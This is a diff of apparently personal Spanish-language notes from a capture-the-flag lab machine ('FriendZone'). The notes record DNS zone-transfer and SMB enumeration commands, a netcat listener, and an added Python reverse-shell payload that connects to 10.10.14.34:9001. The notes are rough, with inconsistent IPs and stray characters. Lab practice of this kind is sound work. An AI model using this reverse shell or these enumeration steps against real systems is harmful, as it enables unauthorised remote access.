@@ -87,27 +87,35 @@ dig axfr friendzone.red @10.10.10.123
 
 https://www.welivesecurity.com/la-es/2015/06/17/trata-ataque-transferencia-zona-dns/
 
-admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
 friendzoneportal.red
 friendzone.red
-files.friendzoneportal.red. 604800 IN	A	127.0.0.1
-imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
-vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
-hr.friendzone.red.	604800	IN	A	127.0.0.1
-uploads.friendzone.red.	604800	IN	A	127.0.0.1
-administrator1.friendzone.red. 604800 IN A	127.0.0.1
+
+dig axfr friendzoneportal.red @10.10.10.123
+
+admin.friendzoneportal.red
+files.friendzoneportal.red
+imports.friendzoneportal.red
+vpn.friendzoneportal.red
+
+dig axfr friendzone.red @10.10.10.123=
+
+hr.friendzone.red
+uploads.friendzone.red
+administrator1.friendzone.red
 
 
 ------------------------------------------------------------ SEGUNSO INTENTO ----------------------------------------------
 
 smbmap -H 10.10.10.123
 
-Testing some functions !
+smbclient --list 10.10.10.23
 
-I'am trying not to break things !
-dUpuZmwxcGcyWTE1ODM5NTU1NzFqTHlmWTdJelE5 = conversion base64 y el resultado es uJnfl1pg2Y1583955571jLyfY7IzQ9
+smbclient //friendzone.htb/general
 
-dig axfr @10.10.10.123 friendzone.red
+smbclient //friendzone.htb/Development
+
+dig axfr @10.10.10.123 friendzone.red administrator1.friendzone.red
+dig axfr @10.10.10.123 friendzoneportal.red
 
 admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
 files.friendzoneportal.red. 604800 IN	A	127.0.0.1
@@ -141,4 +149,45 @@ El módulo os nos permite acceder a funcionalidades dependientes del Sistema Ope
 Python nos permite trabajar en dos niveles diferentes con respecto al sistema de archivos y directorios. Uno de ellos, es a través del módulo os, que como su nombre lo indica, nos facilita el trabajo con todo el sistema de archivos y directorios, a nivel del propios Sistema Operativo. El segundo nivel -más simple-, es el que nos permite trabajar con archivos, manipulando su lectura y escritura a nivel de la aplicación y tratando a cada archivo como un objeto.
 
 nc -lvnp 9001
+
+Scenario: Success: DNS zone transfer
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.34",9001))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
